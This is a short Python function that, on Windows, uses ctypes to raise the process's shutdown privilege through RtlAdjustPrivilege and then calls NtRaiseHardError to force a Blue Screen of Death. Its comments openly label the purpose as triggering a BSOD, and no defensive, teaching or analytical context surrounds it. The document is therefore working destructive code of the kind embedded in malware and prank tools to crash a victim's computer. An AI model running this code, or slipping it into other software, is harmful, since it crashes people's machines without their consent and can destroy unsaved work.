def trigger():
    from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
    from sys import platform

    if platform != "win32":
        return

    # Adjust privilege to allow BSOD
    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),  
        c_uint(1),
        c_uint(0),  
        byref(c_int())
    )

    # Trigger BSOD
    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),  
        c_ulong(0),
        POINTER(c_int)(),
        POINTER(c_int)(),
        c_uint(6),  #
        byref(c_uint())
    )